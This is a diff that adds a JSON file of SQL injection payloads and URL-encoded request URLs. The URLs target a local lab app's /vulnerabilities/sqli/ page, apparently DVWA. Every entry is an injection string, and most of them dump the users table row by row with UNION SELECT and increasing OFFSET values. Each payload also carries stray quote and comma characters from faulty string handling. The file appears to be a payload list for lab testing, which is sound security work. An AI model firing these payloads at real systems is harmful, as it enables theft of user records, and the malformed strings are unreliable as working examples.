@@ -1,0 +1,74 @@
+[
+    {
+        "url": "http://localhost:8080/vulnerabilities/sqli/?id=%22%27+OR+1%3D1--%22%2C&Submit=Submit",
+        "payload": "\"' OR 1=1--\","
+    },
+    {
+        "url": "http://localhost:8080/vulnerabilities/sqli/?id=%22%27+UNION+SELECT+NULL--%22%2C&Submit=Submit",
+        "payload": "\"' UNION SELECT NULL--\","
+    },
+    {
+        "url": "http://localhost:8080/vulnerabilities/sqli/?id=%22%27+UNION+SELECT+%2A+FROM+users--%22%2C&Submit=Submit",
+        "payload": "\"' UNION SELECT * FROM users--\","
+    },
+    {
+        "url": "http://localhost:8080/vulnerabilities/sqli/?id=%22%27+UNION+SELECT+%2A+FROM+users+WHERE+1%3D1--%22%2C&Submit=Submit",
+        "payload": "\"' UNION SELECT * FROM users WHERE 1=1--\","
+    },
+    {
+        "url": "http://localhost:8080/vulnerabilities/sqli/?id=%22%27+UNION+SELECT+%2A+FROM+users+WHERE+1%3D1+LIMIT+1%2C1--%22%2C&Submit=Submit",
+        "payload": "\"' UNION SELECT * FROM users WHERE 1=1 LIMIT 1,1--\","
+    },
+    {
+        "url": "http://localhost:8080/vulnerabilities/sqli/?id=%22%27+UNION+SELECT+%2A+FROM+users+WHERE+1%3D1+LIMIT+1%2C1+OFFSET+1--%22%2C&Submit=Submit",
+        "payload": "\"' UNION SELECT * FROM users WHERE 1=1 LIMIT 1,1 OFFSET 1--\","
+    },
+    {
+        "url": "http://localhost:8080/vulnerabilities/sqli/?id=%22%27+UNION+SELECT+%2A+FROM+users+WHERE+1%3D1+LIMIT+1%2C1+OFFSET+2--%22%2C&Submit=Submit",
+        "payload": "\"' UNION SELECT * FROM users WHERE 1=1 LIMIT 1,1 OFFSET 2--\","
+    },
+    {
+        "url": "http://localhost:8080/vulnerabilities/sqli/?id=%22%27+UNION+SELECT+%2A+FROM+users+WHERE+1%3D1+LIMIT+1%2C1+OFFSET+3--%22%2C&Submit=Submit",
+        "payload": "\"' UNION SELECT * FROM users WHERE 1=1 LIMIT 1,1 OFFSET 3--\","
+    },
+    {
+        "url": "http://localhost:8080/vulnerabilities/sqli/?id=%22%27+UNION+SELECT+%2A+FROM+users+WHERE+1%3D1+LIMIT+1%2C1+OFFSET+4--%22%2C&Submit=Submit",
+        "payload": "\"' UNION SELECT * FROM users WHERE 1=1 LIMIT 1,1 OFFSET 4--\","
+    },
+    {
+        "url": "http://localhost:8080/vulnerabilities/sqli/?id=%22%27+UNION+SELECT+%2A+FROM+users+WHERE+1%3D1+LIMIT+1%2C1+OFFSET+5--%22%2C&Submit=Submit",
+        "payload": "\"' UNION SELECT * FROM users WHERE 1=1 LIMIT 1,1 OFFSET 5--\","
+    },
+    {
+        "url": "http://localhost:8080/vulnerabilities/sqli/?id=%22%27+UNION+SELECT+%2A+FROM+users+WHERE+1%3D1+LIMIT+1%2C1+OFFSET+6--%22%2C&Submit=Submit",
+        "payload": "\"' UNION SELECT * FROM users WHERE 1=1 LIMIT 1,1 OFFSET 6--\","
+    },
+    {
+        "url": "http://localhost:8080/vulnerabilities/sqli/?id=%22%27+UNION+SELECT+%2A+FROM+users+WHERE+1%3D1+LIMIT+1%2C1+OFFSET+7--%22%2C&Submit=Submit",
+        "payload": "\"' UNION SELECT * FROM users WHERE 1=1 LIMIT 1,1 OFFSET 7--\","
+    },
+    {
+        "url": "http://localhost:8080/vulnerabilities/sqli/?id=%22%27+UNION+SELECT+%2A+FROM+users+WHERE+1%3D1+LIMIT+1%2C1+OFFSET+8--%22%2C&Submit=Submit",
+        "payload": "\"' UNION SELECT * FROM users WHERE 1=1 LIMIT 1,1 OFFSET 8--\","
+    },
+    {
+        "url": "http://localhost:8080/vulnerabilities/sqli/?id=%22%27+UNION+SELECT+%2A+FROM+users+WHERE+1%3D1+LIMIT+1%2C1+OFFSET+9--%22%2C&Submit=Submit",
+        "payload": "\"' UNION SELECT * FROM users WHERE 1=1 LIMIT 1,1 OFFSET 9--\","
+    },
+    {
+        "url": "http://localhost:8080/vulnerabilities/sqli/?id=%22%27+UNION+SELECT+%2A+FROM+users+WHERE+1%3D1+LIMIT+1%2C1+OFFSET+10--%22%2C&Submit=Submit",
+        "payload": "\"' UNION SELECT * FROM users WHERE 1=1 LIMIT 1,1 OFFSET 10--\","
+    },
+    {
+        "url": "http://localhost:8080/vulnerabilities/sqli/?id=%22%27+UNION+SELECT+%2A+FROM+users+WHERE+1%3D1+LIMIT+1%2C1+OFFSET+11--%22%2C&Submit=Submit",
+        "payload": "\"' UNION SELECT * FROM users WHERE 1=1 LIMIT 1,1 OFFSET 11--\","
+    },
+    {
+        "url": "http://localhost:8080/vulnerabilities/sqli/?id=%22%27+UNION+SELECT+%2A+FROM+users+WHERE+1%3D1+LIMIT+1%2C1+OFFSET+12--%22%2C&Submit=Submit",
+        "payload": "\"' UNION SELECT * FROM users WHERE 1=1 LIMIT 1,1 OFFSET 12--\","
+    },
+    {
+        "url": "http://localhost:8080/vulnerabilities/sqli/?id=%22%27+UNION+SELECT+%2A+FROM+users+WHERE+1%3D1+LIMIT+1%2C1+OFFSET+13--%22%2C&Submit=Submit",
+        "payload": "\"' UNION SELECT * FROM users WHERE 1=1 LIMIT 1,1 OFFSET 13--\","
+    }
+]
